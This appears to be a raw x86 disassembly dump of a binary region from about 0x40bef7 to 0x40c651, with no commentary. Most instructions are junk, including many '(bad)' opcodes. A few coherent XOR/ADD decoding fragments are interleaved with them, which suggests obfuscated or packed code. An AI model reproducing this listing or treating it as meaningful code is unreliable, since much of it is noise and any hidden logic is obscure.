  40bef7:	daa    
  40bef8:	mov    ch,0xb7
  40befa:	in     al,dx
  40befb:	fbld   TBYTE PTR [eax+0x43c0b4ee]
  40bf01:	sub    ecx,ebx
  40bf03:	packsswb mm4,mm6
  40bf06:	sub    DWORD PTR [esi+0x1e],ebx
  40bf09:	iret   
  40bf0a:	fucom  st(5)
  40bf0c:	xchg   ecx,eax
  40bf0d:	jmp    0x40bea1
  40bf0f:	ret    0xde87
  40bf12:	add    BYTE PTR [ebx],0x51
  40bf15:	aad    0x5a
  40bf17:	outs   dx,DWORD PTR ds:[esi]
  40bf18:	fistp  QWORD PTR [eax-0x7c]
  40bf1b:	mov    eax,ds:0x1b72df3c
  40bf20:	push   ebx
  40bf21:	jle    0x40beb7
  40bf23:	lock mov al,ds:0xa9c8fbaf
  40bf29:	call   0x529f1af2
  40bf2e:	mov    edx,0x678ace52
  40bf33:	enter  0x2089,0xb
  40bf37:	sar    bl,cl
  40bf39:	push   ecx
  40bf3a:	jl     0x40bf8f
  40bf3c:	loope  0x40bf82
  40bf3e:	sub    edi,0xff72411d
  40bf44:	aaa    
  40bf45:	(bad)  
  40bf46:	jnp    0x40bf52
  40bf48:	loop   0x40bf21
  40bf4a:	cli    
  40bf4b:	sub    ecx,DWORD PTR [edi-0x5ae972d4]
  40bf51:	sti    
  40bf52:	adc    edx,DWORD PTR [edi+ebp*4+0x3a]
  40bf56:	add    al,0xe4
  40bf58:	mov    bl,0x52
  40bf5a:	inc    edi
  40bf5b:	add    DWORD PTR [esi-0xd],edx
  40bf5e:	mov    ds,WORD PTR [ebp+0xd]
  40bf61:	mov    ecx,0x14b5fda1
  40bf66:	aas    
  40bf67:	and    ebp,eax
  40bf69:	cmp    dl,al
  40bf6b:	retf   
  40bf6c:	xchg   al,dl
  40bf6e:	mov    eax,ds:0xd8e03156
  40bf73:	xchg   esi,eax
  40bf74:	lea    eax,[esi-0x5f]
  40bf77:	dec    edi
  40bf78:	das    
  40bf79:	pop    edx
  40bf7a:	mov    bh,0x5e
  40bf7c:	pop    ds
  40bf7d:	into   
  40bf7e:	push   edi
  40bf7f:	mov    dl,BYTE PTR [esi]
  40bf81:	sti    
  40bf82:	fs in  eax,0x8b
  40bf85:	jge    0x40bf8f
  40bf87:	mov    edi,DWORD PTR [edi]
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	push   0xffffff9b
  40bfbf:	ret    
  40bfc0:	add    DWORD PTR [esi],edi
  40bfc2:	xchg   esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	sahf   
  40bfca:	imul   eax,DWORD PTR [ebp+0x1c],0xffffffe8
  40bfce:	iret   
  40bfcf:	add    ecx,ecx
  40bfd1:	ret    
  40bfd2:	call   0xa2e8:0x4ed1fb1a
  40bfd9:	mov    edx,DWORD PTR [edx+0x2f]
  40bfdc:	sahf   
  40bfdd:	sub    eax,0x76533a83
  40bfe2:	and    BYTE PTR [edx],0x8
  40bfe5:	adc    BYTE PTR [ecx+0xc8ded7a],0xf2
  40bfec:	rcr    BYTE PTR [edi-0x2c],1
  40bfef:	and    edx,DWORD PTR [ebx-0x1f3a1a91]
  40bff5:	outs   dx,DWORD PTR ds:[esi]
  40bff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bff7:	stos   BYTE PTR es:[edi],al
  40bff8:	push   esi
  40bff9:	xor    ecx,DWORD PTR [eax]
  40bffb:	into   
  40bffc:	fcomp  QWORD PTR [esi-0x5a]
  40bfff:	mov    esi,eax
  40c001:	lahf   
  40c002:	push   edi
  40c003:	loope  0x40c03d
  40c005:	push   ss
  40c006:	das    
  40c007:	(bad)  
  40c009:	gs mov eax,0x7bdcca52
  40c00f:	(bad)  
  40c010:	dec    ebx
  40c011:	pop    ds
  40c012:	sbb    eax,DWORD PTR [eax-0xa]
  40c015:	scas   al,BYTE PTR es:[edi]
  40c016:	int    0x43
  40c018:	push   ds
  40c019:	ja     0x40c087
  40c01b:	cmp    dl,dl
  40c01d:	xchg   DWORD PTR [edx-0x7f],edi
  40c020:	xor    DWORD PTR [esi-0x62e730e0],0x2e
  40c027:	loop   0x40bfba
  40c029:	test   eax,0x8d6cb946
  40c02e:	push   ebx
  40c02f:	jmp    0x40c038
  40c031:	cmp    al,cl
  40c033:	retf   
  40c034:	jb     0x40bfcd
  40c036:	inc    edi
  40c037:	lds    ebp,FWORD PTR [esi+edx*2-0xbac83cf]
  40c03e:	xor    BYTE PTR [esi],ch
  40c040:	and    ebp,ebp
  40c042:	pop    edi
  40c043:	push   0xffffffb4
  40c045:	clc    
  40c046:	mov    bh,0x31
  40c048:	mov    esi,0xfc2dc93f
  40c04d:	sub    eax,0xe03f8df3
  40c052:	imul   esi,ebx,0xffffffff
  40c055:	lods   al,BYTE PTR ds:[esi]
  40c056:	stc    
  40c057:	test   DWORD PTR [ecx-0x5],0xc5a5711a
  40c05e:	scas   eax,DWORD PTR es:[edi]
  40c05f:	sbb    BYTE PTR [eax+0x7976ed8d],al
  40c065:	xor    BYTE PTR fs:[ecx],bl
  40c068:	sbb    al,0x41
  40c06a:	add    DWORD PTR [esi+0x7e],ecx
  40c06d:	push   ss
  40c06e:	sbb    bl,0x4b
  40c071:	mov    dh,0x32
  40c073:	push   0xd8705534
  40c078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c079:	fst    DWORD PTR [ecx-0x43]
  40c07c:	add    eax,DWORD PTR [ebp+eiz*2+0x3b]
  40c080:	jge    0x40c0d5
  40c082:	loope  0x40c05a
  40c084:	adc    eax,0x6533d540
  40c089:	dec    ebx
  40c08a:	push   cs
  40c08b:	cdq    
  40c08c:	std    
  40c08d:	jae    0x40c101
  40c08f:	scas   eax,DWORD PTR es:[edi]
  40c090:	mov    BYTE PTR [ebx+0xc],ch
  40c093:	icebp  
  40c094:	push   esi
  40c095:	(bad)  
  40c096:	cmp    BYTE PTR [edi-0x6c0b783d],ch
  40c09c:	and    DWORD PTR [edi],edi
  40c09e:	sbb    DWORD PTR [ebx-0x77],0x1614c4b
  40c0a5:	sub    DWORD PTR [ecx+0x78b17bed],edx
  40c0ab:	or     al,0x64
  40c0ad:	pop    esp
  40c0ae:	retf   
  40c0af:	mov    bh,0x5a
  40c0b1:	pop    edi
  40c0b2:	jmp    0x40c049
  40c0b4:	mov    al,ds:0x75c8add8
  40c0b9:	fiadd  DWORD PTR [esi]
  40c0bb:	pop    ss
  40c0bc:	pop    ss
  40c0bd:	push   0xffffff90
  40c0bf:	sbb    DWORD PTR [edx],ebp
  40c0c1:	test   BYTE PTR [ecx],dh
  40c0c3:	clc    
  40c0c4:	or     dl,BYTE PTR [ecx-0x47]
  40c0c7:	retf   
  40c0c8:	jb     0x40c0b2
  40c0ca:	xchg   DWORD PTR [ecx],edi
  40c0cc:	call   0x7e67:0x772b74dc
  40c0d3:	leave  
  40c0d4:	mov    edi,0xd3eb0999
  40c0d9:	jmp    0xe5f2d65b
  40c0de:	retf   
  40c0df:	xlat   BYTE PTR ds:[ebx]
  40c0e0:	iret   
  40c0e1:	jg     0x40c0b3
  40c0e3:	out    dx,eax
  40c0e4:	inc    ebx
  40c0e5:	fbstp  TBYTE PTR [ebx]
  40c0e7:	shr    BYTE PTR [edi-0x65],0xd8
  40c0eb:	(bad)  
  40c0ec:	(bad)  
  40c0ed:	pusha  
  40c0ee:	pop    ss
  40c0ef:	stos   DWORD PTR es:[edi],eax
  40c0f0:	fiadd  DWORD PTR [esi+0x42bd6318]
  40c0f6:	imul   ecx,ebp,0x15292855
  40c0fc:	dec    edx
  40c0fd:	push   ds
  40c0fe:	and    eax,0xba21925d
  40c103:	clc    
  40c104:	sbb    DWORD PTR [eax+ecx*2],0x82c91ca9
  40c10b:	stos   BYTE PTR es:[edi],al
  40c10c:	test   al,0x3c
  40c10e:	mov    ch,0x78
  40c110:	jp     0x40c0ab
  40c112:	mov    edx,0x3b9821ad
  40c117:	mov    ebp,?
  40c119:	push   edi
  40c11a:	or     BYTE PTR [ebp-0x1],bh
  40c11d:	in     eax,dx
  40c11e:	mov    al,ds:0x877de4b2
  40c123:	cmp    eax,ecx
  40c125:	mov    ecx,DWORD PTR [ecx-0x5f]
  40c128:	sbb    BYTE PTR [edx-0x70],dh
  40c12b:	test   BYTE PTR [esi],0x52
  40c12e:	add    al,BYTE PTR [edi+0x6b]
  40c131:	mov    al,0xc7
  40c133:	fcom   DWORD PTR [ebp-0x28]
  40c136:	pop    ebx
  40c137:	mov    ch,0x7c
  40c139:	jge    0x40c159
  40c13b:	fisubr WORD PTR [ecx-0xf]
  40c13e:	retf   0x1aa0
  40c141:	pop    ebp
  40c142:	or     DWORD PTR [ecx-0xe129859],esi
  40c148:	push   edi
  40c149:	xor    BYTE PTR [esi-0x78262106],dh
  40c14f:	jo     0x40c0f2
  40c151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c152:	gs das 
  40c154:	repz or eax,0x948a835e
  40c15a:	sub    al,0xe2
  40c15c:	ss jmp 0x3236:0xafb7078d
  40c164:	cmp    edi,edi
  40c166:	add    BYTE PTR [edi-0x723b0117],0x34
  40c16d:	fdiv   DWORD PTR [edx-0x1df7f6fb]
  40c173:	mov    ah,0x48
  40c175:	mov    dl,0x4b
  40c177:	and    BYTE PTR [ebp+0x2b],0xa
  40c17b:	adc    BYTE PTR [edx+0x31e32460],ch
  40c181:	cwde   
  40c182:	arpl   WORD PTR [esi],cx
  40c184:	(bad)  
  40c185:	sti    
  40c186:	push   ss
  40c187:	rcr    DWORD PTR [edx+0x5ca733d6],1
  40c18d:	add    bh,ch
  40c18f:	lods   eax,DWORD PTR ds:[esi]
  40c190:	xchg   BYTE PTR [ecx-0x304e8c2f],dl
  40c196:	or     bl,cl
  40c198:	add    cl,BYTE PTR [edi]
  40c19a:	enter  0xba8f,0x2a
  40c19e:	(bad)  
  40c1a0:	ret    0xcea5
  40c1a3:	(bad)  
  40c1a5:	jmp    0x40c225
  40c1a7:	fld    TBYTE PTR [eax]
  40c1a9:	xor    eax,0xe8692461
  40c1ae:	inc    esp
  40c1af:	dec    edi
  40c1b0:	(bad)  
  40c1b1:	fadd   QWORD PTR [edx+0x3b]
  40c1b4:	sbb    dh,dh
  40c1b6:	inc    esi
  40c1b7:	xchg   ecx,eax
  40c1b8:	stos   BYTE PTR es:[edi],al
  40c1b9:	lea    edi,[ecx]
  40c1bb:	xchg   esi,ebp
  40c1bd:	jb     0x40c1be
  40c1bf:	div    eax
  40c1c1:	jmp    0xb00558ba
  40c1c6:	xlat   BYTE PTR ds:[ebx]
  40c1c7:	and    edi,DWORD PTR [esi+0x3d]
  40c1ca:	fs jmp 0x777d8151
  40c1d0:	inc    ebp
  40c1d1:	xchg   esi,eax
  40c1d2:	jge    0x40c1f6
  40c1d4:	repz pusha 
  40c1d6:	sti    
  40c1d7:	jbe    0x40c198
  40c1d9:	inc    esp
  40c1da:	popa   
  40c1db:	sbb    bh,BYTE PTR [edi-0x5614a0c8]
  40c1e1:	dec    ecx
  40c1e2:	add    al,0x8a
  40c1e4:	sar    DWORD PTR [ecx+0x25882d9e],1
  40c1ea:	xlat   BYTE PTR ds:[ebx]
  40c1eb:	test   DWORD PTR [ecx],ebp
  40c1ed:	(bad)  
  40c1ee:	sub    BYTE PTR [esp+edi*2+0x2c],ah
  40c1f2:	icebp  
  40c1f3:	sti    
  40c1f4:	push   ds
  40c1f5:	cmp    al,0x83
  40c1f7:	pop    eax
  40c1f8:	jnp    0x40c1cf
  40c1fa:	int    0xa2
  40c1fc:	pop    ds
  40c1fd:	js     0x40c199
  40c1ff:	sbb    esi,esp
  40c201:	(bad)  
  40c202:	popf   
  40c203:	add    DWORD PTR [eax+ebx*4-0x2d4984ba],esp
  40c20a:	stc    
  40c20b:	and    eax,0x2ec76184
  40c210:	or     BYTE PTR [edx-0x7d],0x26
  40c214:	xchg   ebp,eax
  40c215:	cs out 0xc,eax
  40c218:	test   DWORD PTR [ecx],edi
  40c21a:	shl    ah,0x4f
  40c21d:	mov    al,0xc6
  40c21f:	daa    
  40c220:	sbb    eax,0x3d85acab
  40c225:	gs std 
  40c227:	jp     0x40c1bc
  40c229:	jecxz  0x40c1fd
  40c22b:	rcl    BYTE PTR [ebp-0x5cd11b81],cl
  40c231:	into   
  40c232:	pop    ecx
  40c233:	pop    ebx
  40c234:	loope  0x40c1eb
  40c236:	cmp    eax,0x3c8b355a
  40c23b:	inc    esp
  40c23c:	cld    
  40c23d:	stos   BYTE PTR es:[edi],al
  40c23e:	pop    ebx
  40c23f:	(bad)  
  40c240:	mov    esi,0x13a8ea2a
  40c245:	mov    ds:0x333201de,al
  40c24a:	mov    esp,0xb81b076c
  40c24f:	fwait
  40c250:	jbe    0x40c1d3
  40c252:	jbe    0x40c20d
  40c254:	mov    bl,0xe7
  40c256:	jle    0x40c270
  40c258:	scas   eax,DWORD PTR es:[edi]
  40c259:	cmp    esi,edx
  40c25b:	jl     0x40c243
  40c25d:	jmp    0x40c28f
  40c25f:	mov    edi,0xc22eb45d
  40c264:	sub    BYTE PTR [esi+ecx*1+0x12],ah
  40c268:	xor    bh,BYTE PTR [ebx+esi*4+0x65]
  40c26c:	sub    bl,BYTE PTR [eax+0x51]
  40c26f:	aad    0xe5
  40c271:	dec    edi
  40c272:	sbb    esp,ebx
  40c274:	mov    BYTE PTR [ebp-0x4e07fd7f],ch
  40c27a:	pop    ds
  40c27b:	and    ebp,DWORD PTR [ebx+0x4176ef2]
  40c281:	shl    dl,0x75
  40c284:	xor    eax,DWORD PTR [edi-0x56fbfec6]
  40c28a:	out    dx,eax
  40c28b:	pop    edi
  40c28c:	sbb    al,0x11
  40c28e:	inc    ecx
  40c28f:	push   ebx
  40c290:	xchg   BYTE PTR [eax+0x5],al
  40c293:	loopne 0x40c280
  40c295:	inc    edi
  40c296:	cmp    eax,ebx
  40c298:	fmul   DWORD PTR [eax]
  40c29a:	mov    eax,ds:0xc875b139
  40c29f:	mov    ecx,0xb9afcae3
  40c2a4:	mov    ds:0xa06b4e94,al
  40c2a9:	push   ebp
  40c2aa:	mov    cl,0x5d
  40c2ac:	out    dx,al
  40c2ad:	ins    BYTE PTR es:[edi],dx
  40c2ae:	in     al,0xe9
  40c2b0:	xchg   esp,eax
  40c2b1:	leave  
  40c2b2:	cmp    DWORD PTR [ecx+0x19],ecx
  40c2b5:	imul   edi,DWORD PTR [ebx],0x5e6eae95
  40c2bb:	pop    edx
  40c2bc:	(bad)  
  40c2bd:	repz je 0x40c312
  40c2c0:	aad    0xe9
  40c2c2:	add    ecx,DWORD PTR [ebx-0x27ba7494]
  40c2c8:	mov    di,WORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax-0x80],bh
  40c2e3:	xor    eax,0x9b3a1ee7
  40c2e8:	js     0x40c362
  40c2ea:	je     0x40c36a
  40c2ec:	js     0x40c366
  40c2ee:	xlat   BYTE PTR ds:[ebx]
  40c2ef:	cdq    
  40c2f0:	es mov edi,0xe409f4a4
  40c2f6:	xchg   esi,eax
  40c2f7:	add    al,0x8f
  40c2f9:	addr16 push ebp
  40c2fb:	rcl    bl,1
  40c2fd:	call   0xa3fd7783
  40c302:	int3   
  40c303:	rol    ebp,0x7c
  40c306:	sub    ebp,0x60
  40c309:	mov    eax,0x1be7faed
  40c30e:	xchg   DWORD PTR [ebx],eax
  40c310:	bound  ecx,QWORD PTR [edi-0xb8ded47]
  40c316:	jb     0x40c391
  40c318:	into   
  40c319:	ins    DWORD PTR es:[edi],dx
  40c31a:	pop    ebx
  40c31b:	dec    eax
  40c31c:	in     eax,dx
  40c31d:	in     eax,0xa7
  40c31f:	neg    dl
  40c321:	pusha  
  40c322:	xor    DWORD PTR [edi],ebx
  40c324:	mov    ch,0xa7
  40c326:	(bad)  
  40c327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c328:	ret    
  40c329:	repnz mov dl,BYTE PTR [edi]
  40c32c:	ja     0x40c32f
  40c32e:	mov    bl,0x2c
  40c330:	(bad)  
  40c331:	cs pop eax
  40c333:	shr    BYTE PTR [esi+ebp*8+0x52],0x92
  40c338:	hlt    
  40c339:	cli    
  40c33a:	(bad)  
  40c33b:	icebp  
  40c33c:	and    DWORD PTR [edi+0x26],ebx
  40c33f:	pusha  
  40c340:	and    eax,0xcd37ef16
  40c345:	daa    
  40c346:	scas   eax,DWORD PTR es:[edi]
  40c347:	repnz and eax,0x64
  40c34b:	and    DWORD PTR [edx+0x7f],esp
  40c34e:	mov    eax,ds:0xdade639f
  40c353:	adc    al,BYTE PTR [edi]
  40c355:	xchg   ecx,eax
  40c356:	lods   al,BYTE PTR ds:[esi]
  40c357:	fcom   DWORD PTR [ebx+0x47]
  40c35a:	push   esp
  40c35b:	push   esp
  40c35c:	push   esi
  40c35d:	test   edi,edx
  40c35f:	data16 icebp 
  40c361:	aas    
  40c362:	ins    DWORD PTR es:[edi],dx
  40c363:	iret   
  40c364:	pop    esp
  40c365:	daa    
  40c366:	std    
  40c367:	xlat   BYTE PTR ds:[ebx]
  40c368:	int3   
  40c369:	loop   0x40c2fc
  40c36b:	pusha  
  40c36c:	cwde   
  40c36d:	xor    ch,bl
  40c36f:	lods   al,BYTE PTR ds:[esi]
  40c370:	test   eax,0x22d91af6
  40c375:	repnz add ch,BYTE PTR [ebx-0xf51a0e4]
  40c37c:	stos   DWORD PTR es:[edi],eax
  40c37d:	(bad)  
  40c37e:	iret   
  40c37f:	adc    ebp,DWORD PTR [esi-0x3bde3c6e]
  40c385:	sub    eax,0x56e0f27e
  40c38a:	push   eax
  40c38b:	cmp    eax,0x37a3dcee
  40c390:	push   ecx
  40c391:	adc    edx,esi
  40c393:	stc    
  40c394:	pop    esp
  40c395:	mov    bh,0x99
  40c397:	dec    DWORD PTR [ecx+0x46]
  40c39a:	sub    cl,BYTE PTR [ecx-0x5bfd4d57]
  40c3a0:	adc    al,0xa6
  40c3a2:	pushf  
  40c3a3:	and    al,0xac
  40c3a5:	out    dx,eax
  40c3a6:	out    dx,al
  40c3a7:	ds sahf 
  40c3a9:	test   DWORD PTR [edx-0x4c2f0644],esp
  40c3af:	xor    al,0x1c
  40c3b1:	jmp    0xdd3292d6
  40c3b6:	mov    bl,0x74
  40c3b8:	pop    esp
  40c3b9:	xchg   esp,eax
  40c3ba:	xor    DWORD PTR [edx],edi
  40c3bc:	imul   ebp,DWORD PTR [ebp+0x4179df2a],0x60
  40c3c3:	into   
  40c3c4:	sub    al,0xc0
  40c3c6:	mov    edx,0xde388a93
  40c3cb:	mov    ecx,DWORD PTR fs:[ebx-0x57e7280]
  40c3d2:	imul   esp,esi,0x0
  40c3d5:	add    eax,0x1bdf834b
  40c3da:	enter  0x7ee3,0x75
  40c3de:	mov    eax,ds:0xf5a82709
  40c3e3:	xor    ah,cl
  40c3e5:	loop   0x40c3d9
  40c3e7:	mov    ds:0x80e70078,eax
  40c3ec:	add    BYTE PTR [eax],bl
  40c3ee:	clc    
  40c3ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3f0:	adc    eax,0x16ebbe5f
  40c3f5:	jnp    0x40c39d
  40c3f7:	xchg   edi,eax
  40c3f8:	push   cs
  40c3f9:	xchg   esi,eax
  40c3fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3fb:	ret    
  40c3fc:	(bad)  
  40c3fd:	xchg   ebx,eax
  40c3fe:	inc    ecx
  40c3ff:	dec    esi
  40c400:	ja     0x40c3ef
  40c402:	adc    DWORD PTR ds:0x90e1ff9f,ecx
  40c408:	lock sar BYTE PTR [ebx-0x32],cl
  40c40c:	cld    
  40c40d:	test   al,cl
  40c40f:	sub    al,0xf5
  40c411:	lahf   
  40c412:	dec    ebp
  40c413:	cli    
  40c414:	(bad)  
  40c415:	pop    ecx
  40c416:	push   esi
  40c417:	mov    ah,0x70
  40c419:	fbld   TBYTE PTR [ecx+0x56413c8]
  40c41f:	jmp    0x40c40e
  40c421:	and    bl,bh
  40c423:	pop    ebx
  40c424:	push   ss
  40c425:	loop   0x40c3ca
  40c427:	mov    al,0x3
  40c429:	jle    0x40c47a
  40c42b:	push   esp
  40c42c:	xor    DWORD PTR [eax+0x2c303c66],edi
  40c432:	inc    ebp
  40c433:	sub    esp,DWORD PTR [eax+ebx*4+0x1c]
  40c437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c438:	into   
  40c439:	std    
  40c43a:	push   ebp
  40c43b:	fwait
  40c43c:	push   cs
  40c43d:	imul   ebx,DWORD PTR [edi+edx*8-0x20c8a1d5],0x37
  40c445:	push   ebp
  40c446:	shl    BYTE PTR [ebp+0x30d3671b],1
  40c44c:	(bad)  
  40c44d:	js     0x40c45d
  40c44f:	(bad)  [ebx-0xcd5b287]
  40c455:	cmp    esp,edx
  40c457:	push   edx
  40c458:	pop    esi
  40c459:	sub    eax,0x1ff73f1b
  40c45e:	arpl   di,dx
  40c460:	jno    0x40c4ad
  40c462:	gs sti 
  40c464:	sub    edi,eax
  40c466:	jg     0x40c4a9
  40c468:	add    al,0x3a
  40c46a:	adc    al,0xc5
  40c46c:	and    DWORD PTR [edi+0x4b1df1c0],eax
  40c472:	outs   dx,BYTE PTR ds:[esi]
  40c473:	xor    BYTE PTR [edx],dh
  40c475:	mov    ebp,0xf66b557c
  40c47a:	psrlq  mm4,QWORD PTR [ebp-0x3da8b7b2]
  40c481:	les    edx,FWORD PTR [eax+0x3d]
  40c484:	mov    bl,0x74
  40c486:	icebp  
  40c487:	in     eax,0xab
  40c489:	(bad)  
  40c48a:	xchg   esp,eax
  40c48b:	cmp    BYTE PTR [esi],dl
  40c48d:	int3   
  40c48e:	dec    ecx
  40c48f:	imul   eax,DWORD PTR [edi],0x34d039c5
  40c495:	cmp    DWORD PTR [edi],ebp
  40c497:	pop    edx
  40c498:	jg     0x40c48c
  40c49a:	imul   ebp,DWORD PTR [edx-0x40da56a1],0xffffff8d
  40c4a1:	(bad)  
  40c4a2:	inc    eax
  40c4a3:	lock or ebp,eax
  40c4a6:	ds dec edi
  40c4a8:	es test eax,0x2bcd5c0c
  40c4ae:	popa   
  40c4af:	and    ebx,DWORD PTR [ecx-0x3a]
  40c4b2:	cmc    
  40c4b3:	cmp    esp,eax
  40c4b5:	xchg   edx,eax
  40c4b6:	ja     0x40c4c6
  40c4b8:	nop
  40c4b9:	mov    edx,0xe2a94ee1
  40c4be:	scas   eax,DWORD PTR es:[edi]
  40c4bf:	sub    al,0xc3
  40c4c1:	inc    ebp
  40c4c2:	sbb    eax,0x1d7ce814
  40c4c7:	outs   dx,BYTE PTR ds:[esi]
  40c4c8:	xor    eax,ebx
  40c4ca:	xchg   edi,eax
  40c4cb:	jg     0x40c4e8
  40c4cd:	adc    ecx,DWORD PTR [edx+0x66e38390]
  40c4d3:	pop    ecx
  40c4d4:	out    0xec,eax
  40c4d6:	lods   al,BYTE PTR ds:[esi]
  40c4d7:	push   0xfe8cbf41
  40c4dc:	add    al,0xe6
  40c4de:	leave  
  40c4df:	fs cs out dx,eax
  40c4e2:	mov    ecx,0x1ca0ecdf
  40c4e7:	pushf  
  40c4e8:	xor    DWORD PTR [eax],esi
  40c4ea:	add    dl,BYTE PTR [ecx]
  40c4ec:	arpl   bx,bx
  40c4ee:	pusha  
  40c4ef:	(bad)  
  40c4f0:	jnp    0x40c4c5
  40c4f2:	into   
  40c4f3:	lods   eax,DWORD PTR ds:[esi]
  40c4f4:	iret   
  40c4f5:	call   0x5fce:0x6d6f8c4
  40c4fc:	adc    DWORD PTR [ebx+0x11],esi
  40c4ff:	in     al,0x35
  40c501:	mov    ch,0x12
  40c503:	jno    0x40c54b
  40c505:	adc    al,0x7
  40c507:	push   esp
  40c508:	cmp    DWORD PTR [ebp-0x7ed58a4d],0xffffffb8
  40c50f:	adc    DWORD PTR [edi-0x30eb26cb],0x1
  40c516:	aas    
  40c517:	cdq    
  40c518:	dec    ecx
  40c519:	fwait
  40c51a:	add    ah,al
  40c51c:	jp     0x40c4a7
  40c51e:	add    eax,0x3cef6963
  40c523:	mov    eax,ds:0x6b99d68c
  40c529:	cld    
  40c52a:	jae    0x40c4d5
  40c52c:	es xchg ebp,eax
  40c52e:	test   ebx,ebp
  40c530:	stos   DWORD PTR es:[edi],eax
  40c531:	popa   
  40c532:	dec    ecx
  40c533:	xchg   edi,eax
  40c534:	xor    dl,BYTE PTR [ebp-0xc]
  40c537:	jne    0x40c581
  40c539:	or     al,cl
  40c53b:	sbb    al,0x1a
  40c53d:	addps  xmm5,XMMWORD PTR [edi+0x4]
  40c541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c542:	mov    edx,0x45c820ce
  40c547:	mov    ebx,0x5d305231
  40c54c:	cli    
  40c54d:	mov    eax,0x43e80399
  40c552:	sar    DWORD PTR [ebx-0x55],cl
  40c555:	dec    eax
  40c556:	jne    0x40c5a4
  40c558:	ds xchg edi,eax
  40c55a:	stc    
  40c55b:	int    0x44
  40c55d:	sar    bl,0x8b
  40c560:	pop    esi
  40c561:	adc    ebx,DWORD PTR [ecx+0x16678d2b]
  40c567:	(bad)  
  40c568:	pop    esp
  40c569:	adc    eax,ebx
  40c56b:	or     bl,BYTE PTR [edx]
  40c56d:	mov    DWORD PTR [edi+ecx*1-0x76a7ec34],esp
  40c574:	xor    eax,0x28a864ed
  40c579:	mov    cl,0x7f
  40c57b:	sbb    BYTE PTR [edx-0x59],0xbb
  40c57f:	push   ds
  40c580:	adc    al,0xf
  40c582:	loop   0x40c50e
  40c584:	sub    eax,0x5a975bf1
  40c589:	cmp    ebp,eax
  40c58b:	imul   ecx,DWORD PTR [ebx],0xffffff97
  40c58e:	cli    
  40c58f:	sub    ecx,esi
  40c591:	sub    eax,0xa1e3566d
  40c596:	jne    0x40c5e2
  40c598:	cmc    
  40c599:	push   eax
  40c59a:	cld    
  40c59b:	push   0xe5bab296
  40c5a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5a2:	inc    ebx
  40c5a3:	sar    BYTE PTR [eax],cl
  40c5a5:	inc    ebp
  40c5a6:	imul   ebp,DWORD PTR [ebx],0xa5d43ec7
  40c5ac:	pop    edx
  40c5ad:	jb     0x40c608
  40c5af:	mov    dh,0x4a
  40c5b1:	jg     0x40c548
  40c5b3:	pop    esi
  40c5b4:	hlt    
  40c5b5:	or     ch,BYTE PTR [eax-0x79431221]
  40c5bb:	jne    0x40c5a5
  40c5bd:	lahf   
  40c5be:	cmp    al,0xd2
  40c5c0:	add    edi,DWORD PTR [edx-0x19d33b68]
  40c5c6:	fbstp  TBYTE PTR [ecx]
  40c5c8:	push   ecx
  40c5c9:	mov    bl,BYTE PTR [edx]
  40c5cb:	rcr    DWORD PTR [eax-0x5f],0x21
  40c5cf:	pop    ds
  40c5d0:	sub    al,0x34
  40c5d2:	out    dx,al
  40c5d3:	nop
  40c5d4:	jmp    0x40c650
  40c5d6:	push   es
  40c5d7:	sub    al,0xab
  40c5d9:	cs stc 
  40c5db:	push   edi
  40c5dc:	out    dx,eax
  40c5dd:	xchg   ebx,eax
  40c5de:	mov    eax,0xddcee0f9
  40c5e3:	xor    eax,0x4cf8aef0
  40c5e8:	push   esi
  40c5e9:	and    al,0x66
  40c5eb:	xor    edi,ebx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0xfed2d2f7
  40c613:	cwde   
  40c614:	out    dx,eax
  40c615:	cmp    eax,0x78789836
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	mov    eax,ds:0x5baf49a8
  40c623:	add    BYTE PTR [ebx+0x4b51e6f1],bh
  40c629:	popa   
  40c62a:	cmp    DWORD PTR [ebx-0x29],ecx
  40c62d:	mov    dh,0xa6
  40c62f:	pop    es
  40c630:	push   ebp
  40c631:	test   DWORD PTR [edx],ebp
  40c633:	jb     0x40c60d
  40c635:	cmovbe edx,DWORD PTR [ebx-0x3]
  40c639:	adc    al,0xe5
  40c63b:	or     eax,0xc1b8fac7
  40c640:	retf   0x3aeb
  40c643:	iret   
  40c644:	aam    0x2a
  40c646:	in     al,0x6f
  40c648:	aad    0x6f
  40c64a:	xor    DWORD PTR [ecx+0x4b],edi
  40c64d:	sbb    dl,BYTE PTR [eax]
  40c64f:	out    dx,al
  40c650:	nop
  40c651:	shl    BYTE PTR [ebx+0x68],cl
